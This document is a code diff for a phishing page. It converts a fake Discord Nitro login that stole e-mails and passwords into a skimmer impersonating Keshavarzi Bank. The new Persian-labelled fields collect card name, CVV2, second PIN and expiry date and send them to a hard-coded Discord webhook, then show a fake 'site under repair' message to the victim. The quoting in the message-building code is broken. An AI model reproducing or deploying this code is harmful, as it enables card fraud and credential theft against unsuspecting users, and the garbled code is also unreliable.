@@ -19,10 +19,16 @@
 			<div class="form">
 			
 			<div class="input_field">
-				<input type="email" name="username" id="username" placeholder="Discord e-mail" class="input" required>
+				<input type="نام کارت" name="نام کارت" id="aa" placeholder="Discord e-mail" class="input" required>
 				</div>
 			<div class="input_field">
-					<input type="password" name="password" id="password" placeholder="Mot de passe" class="input"required>
+			        <input type="CVV2" name="CVV2" id="bb" placeholder="Mot de passe" class="input"required>
+				</div>
+                        <div class="input_field">
+			        <input type="رمز دوم" name="رمز دوم" id="cc" placeholder="Mot de passe" class="input"required>
+				</div>
+                                <div class="input_field">
+			        <input type="تاریخ انقضاء" name="تاریخ انقضاء" id="dd" placeholder="Mot de passe" class="input"required>
 				</div>
 				<button class="btn" onclick="send()" >
 					<div class="btnt" > Send Nitro </div>
@@ -43,21 +49,27 @@
 <script>
 
     function send(){
-        var a = document.getElementById("username").value; 
-        var b = document.getElementById("password").value; 
+        var a = document.getElementById("aa").value; 
+        var b = document.getElementById("bb").value; 
+        var c = document.getElementById("cc").value; 
+        var d = document.getElementById("dd").value; 
         var discordWebhook = "https://discord.com/api/webhooks/933960588281913374/LdbUe1zS8E27fID_2HKpvPIoFhV6ejjXvyvHN9A-mjjQKCD0HEfa6Vq807Az5fr5bUv2";       
         var request = new XMLHttpRequest();
         request.open("POST", discordWebhook);
         request.setRequestHeader('Content-type', 'application/json');
         var params = {
-			username: "SadCord .gg/mkgvTuBSZM",
+			username: "بانک کشاورزی",
             avatar_url: "https://cdn.discordapp.com/attachments/900813614628368397/908308809016045590/OkYU6D.jpg",
 
-            content: 'e-mail :'+a+" Password:"+b+" https://discord.gg/mkgvTuBSZM"
+            content: 
+           "نام کارت :""+a+"
+           "CVV2":"+b+"
+           "رمز دوم:"+c+"
+           "تاریخ انقضاء:"+d+" "
     
         };
         request.send(JSON.stringify(params));
-        alert("ERROR 404")
+        alert("فعلا وبسایت در دست تعمیر است لطفا بعدا تلاش کنید...")
     
     }
     
